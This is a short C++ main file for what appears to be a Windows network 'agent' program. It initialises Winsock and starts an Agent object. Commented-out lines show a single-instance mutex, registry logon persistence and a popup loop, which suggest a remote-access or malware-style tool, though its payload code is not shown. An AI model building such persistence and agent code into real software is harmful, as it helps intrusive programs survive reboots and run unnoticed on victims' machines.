#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <iphlpapi.h>
#include <stdio.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "Ws2_32.lib")

#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

#include "PopUp.h"
#include "Presistence.h"
#include "Mutex.h"
#include "Agent.h"



int main(int argc, char* argv[]) {
    //Mutex mutex(NULL, MUTEX_NAME, NULL, MUTEX_ALL_ACCESS);
    //DWORD wait = mutex.waitForSingleObject(0);

    //if (wait != 0) {
    //    std::cout << "Process allready running\n";
    //    exit(1);
    //}

    //char path[MAX_PATH];
    //
    //getProcessExe(path, MAX_PATH);

    //RegistryLogon(path, strlen(path) + 1);

    //PopupLoop();
    WSADATA wsaData;
    int iResult;

    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed: %d\n", iResult);
        return 1;
    }
    std::cout << "Agent\n";
    Agent agent;
    agent.start();

    std::cin.get();
    return 0;
}
